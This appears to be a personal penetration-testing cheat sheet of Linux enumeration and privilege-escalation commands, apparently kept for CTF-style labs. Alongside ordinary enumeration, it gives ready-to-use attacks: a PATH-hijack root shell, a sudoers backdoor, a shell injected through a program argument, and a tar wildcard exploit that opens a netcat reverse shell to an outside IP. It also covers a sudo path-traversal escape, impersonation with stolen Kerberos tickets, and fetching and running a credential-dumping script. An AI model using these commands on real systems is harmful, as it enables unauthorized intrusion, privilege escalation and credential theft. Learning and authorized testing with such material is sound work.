### Dump Details of Headers of a page 
```
curl -I http://xxxxxxxxx
```

### Find all SUID/SGID on Server
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
or 
find / -perm /4000 -type f 2>/dev/null
```

### Find all Writable Files/folders
```
find / -writable 2>/dev/null
```

### Reverse SSH on your machine
```
ssh -L 10000:localhost:6666 agent47@10.10.192.4
(it get the port 10000 from the ssh session and redirects to localhost:6666
```

### Find file recursively everithing
```
grep -r '*.txt' .
OR
find / -name *.txt
```

### Browse a SMB share
```
smbclient //contoso.com/myshare --user=contoso.com/david%mynicepassword
```

### NTLM Hash Format
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
From this string the hash is the last string after : which is 0e0363213e37b94221497260b0bcb4fc
```

### Convert file to Unix Format
```
dos2unix filename
```

### List all Capabilities ***Recursively***
```
getcap -r /
```

### List PATH
```
echo $PATH
```

### Add new folder to PATH
```
export PATH=/some/fol/der:$PATH
```

### How to Abuse of PATH	
```
/* exe.c */
void main()
{
	setuid(0);
	setgid(0);
	system("ps");
}
```
In this example the "ps" is called without an absolute Path which means it will be searched in PATH varibles. We can exploit this and spawn a new shell.
```
cd /tmp (move to a tmp folder)
echo "/bin/bash" > ps (create a shell from ps)
export PATH=/tmp:$PATH (add the folder containing ps to PATH)
chmod 777 ps (give full permissions to the new module)
./exe (it will spawn a new shell)
```

### Get last connected user
```
last
```

### Get Running services
```
ps axf
```

### Get Listening TCP services with process and port

```
sudo netstat -alntp
```


### Enumerate DNS records 
```
dig -t AXFR <domain> @<DNS IP>
```

### Enumerate all ports like NMAP
```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

### Add root to a user
```
Edit /etc/sudoers
Edit the username and match same permissions as root user
root    ALL=(ALL:ALL) ALL
fakeuser    ALL=(ALL:ALL) ALL
./pingSys 127.0.0.1; /bin/sh
```
The semicolon will be interpreted as a command delimiter by the current shell. This means it will first execute ./pingSys 127.0.0.1 in the current shell and then /bin/sh in the current shell, i.e. spawning a new shell with the current (non-privileged) permissions.
What you instead need to do is to put quotes around your argument so that it gets passed in full to your pingSys program instead of getting interpreted by the current shell:
```
 $ ./pingSys '127.0.0.1; /bin/sh'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.071 ms
...
# whoami
root
```

### TAR Wildcard exploitation
```
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```

### Escape Rshell (Restricted shell)
```
ssh <user>@<ip> -c "/bin/bash -i"
```

### Scan open ports with NC binary 
(it will scan for all open ports on the IP by trying to connect)
```
1)Upload a static binary NC
2)nc -zv **IP_address** 1-65535
```

### How to bypass Wildcard in Paths
If you can do this ex.: 
```
User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```
The file *.js don't need to be place exactly in that folder, instead you can escape with Directory Traversal and place it somewhere else you have write permissions ex. `/tmp/shell.js`
And then to bypass since it's only checking that is a *.js you can escape path with:
```
/usr/bin/node /usr/local/scripts/../../../tmp/shell.js
```
(here are we escaping and moving towards another folder but maintaining the control that is a js file)

### Get environmental variables
```
cat /proc/self/environ
```

### Download all FTP files available
```
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

### Get SMB share fullpath	
```
rpcclient -U "" 10.129.14.128 
```
(Connect via RPC first)
```
netshareenumall
```
(Enumerate all shares)
```
netsharegetinfo <share>
```
(Get Detailed informations about a share)

### Footprint IMAP/POP3 service
```
curl -k 'imaps://ip' --user user:p4ssw0rd -v 
```

### Coonect to POP3 via TSL
```
openssl s_client -connect 10.129.14.128:pop3s
```

### Coonect to IMAP via TSL
```
openssl s_client -connect 10.129.14.128:imaps
```

### Connect to MSSQL server
```
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```
Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
```
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
```

### Check if Linux is Domain joined
```
realm list
```

### List Kerberos tickets
```
klist -k -t 
```

### List all keytab
```
find / -name *keytab* -ls 2>/dev/null
```

### Decrypt Keytab files
https://github.com/sosdave/KeyTabExtract

### Impersonate with Keytab tickets
```
kinit USERNAME@DOMAIN -k -t PATHTOFILE.keytab
```

### Use ccache tickets(you have to be root or owner of those files)
```
ls -la /tmp
```
(Find ccache tickets from /tmp)
Copy them somewhere else
```
export KRB5CCNAME=PATHTOCCACHE
```
(This will point system to use the ccache)

### Linux Alternative to Mimikatz
```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
./linikatz.sh
```